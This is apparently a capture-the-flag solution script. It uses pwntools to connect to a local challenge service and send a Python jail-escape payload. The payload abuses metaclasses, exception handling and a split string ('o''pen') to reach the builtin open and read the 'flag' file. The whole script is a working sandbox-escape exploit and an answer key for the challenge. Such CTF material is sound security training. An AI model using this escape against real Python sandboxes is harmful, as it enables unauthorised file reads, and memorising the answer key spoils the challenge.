#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

r = remote('127.0.0.1', 1337)
r.recvuntil(b'Select an option from the menu: ')

r.sendline(b'3')
r.recvuntil(b'Select an option from the menu: ')

r.sendline(b'1')
r.recvuntil(b'>> ')

solution = b"""
class Solver(BaseException):
    __contains__ = print
class X(metaclass=Solver): None
try:
    raise Solver
except Solver as solution:
    Solver.__getitem__ = __builtins__.__dict__['o''pen']
    op_file = solution['flag']
    Solver.__getitem__ = op_file.read
    op_file_content = solution[None]
    op_file_content in X
STOP
"""

r.sendlines(solution.split(b'\n'))
r.sendline(b"9")

print(r.recvuntil(b'BtSCTF{'))
print(r.recvuntil(b'}'))

exit(0)